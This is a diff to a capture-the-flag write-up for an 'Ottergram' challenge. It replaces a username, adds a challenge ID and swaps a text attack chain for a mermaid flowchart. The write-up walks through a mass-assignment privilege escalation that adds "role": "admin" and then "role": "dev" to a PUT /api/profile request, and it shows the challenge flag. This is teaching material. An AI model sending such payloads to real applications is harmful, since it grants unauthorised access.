@@ -1,4 +1,4 @@
-# Ottergram — Devs didn't trust the admins, so they removed them.
+# Ottergram — ottergram-010 — Devs didn't trust the admins, so they removed them.
 
 ## 1. Register a normal account
 
@@ -6,7 +6,7 @@ Open the challenge instance and register a normal user.
 
 For example:
 
-`Username: fashil`
+`Username: test`
 
 Log in normally.
 
@@ -14,12 +14,12 @@ Log in normally.
 
 Navigate to your profile:
 
-`/profile/fashil`
+`/profile/test`
 
 Edit your profile and save a normal change, such as:
 ```json
 {
-  "full_name": "Fashil",
+  "full_name": "Test",
   "bio": "Test"
 }
 ```
@@ -42,7 +42,7 @@ The interesting thing is that the profile endpoint accepts JSON.
 Add a privileged-looking property to the request:
 ```json
 {
-  "full_name": "Fashil",
+  "full_name": "Test",
   "bio": "Test",
   "role": "admin"
 }
@@ -120,7 +120,7 @@ Modify the same vulnerable profile request:
 with:
 ```json
 {
-  "full_name": "Fashil",
+  "full_name": "Test",
   "bio": "Test",
   "role": "dev"
 }
@@ -169,34 +169,19 @@ bug{96UrNyE8z4RcrioLdI3FnAvLFJOkthno}
 ```
 
 ## Attack chain
-
-Register normal user
-       ↓
-Edit profile
-       ↓
-PUT /api/profile
-       ↓
-Add "role": "admin"
-       ↓
-Mass assignment
-       ↓
-Admin functionality appears
-       ↓
-GET /api/admin/analytics
-       ↓
-403 Access denied
-       ↓
-Hint → investigate "dev"
-       ↓
-PUT /api/profile
-"role": "dev"
-       ↓
-GET /api/admin/analytics
-       ↓
-200 OK
-       ↓
-Flag exposed
-
+```mermaid
+flowchart TD
+    A["Register a normal user"] --> B["Edit profile"]
+    B --> C["Include admin role in request"]
+    C --> D["Mass assignment exploit succeeds"]
+    D --> E["Admin features become visible"]
+    E --> F["Try viewing admin analytics"]
+    F --> G["Access denied 403 error"]
+    G --> H["Notice hint about developer role"]
+    H --> I["Update profile with developer role"]
+    I --> J["View admin analytics again"]
+    J --> K["Access granted and flag exposed"]
+```
 ## Vulnerabilities
 
 ### 1. Mass Assignment / Improper Property Authorization
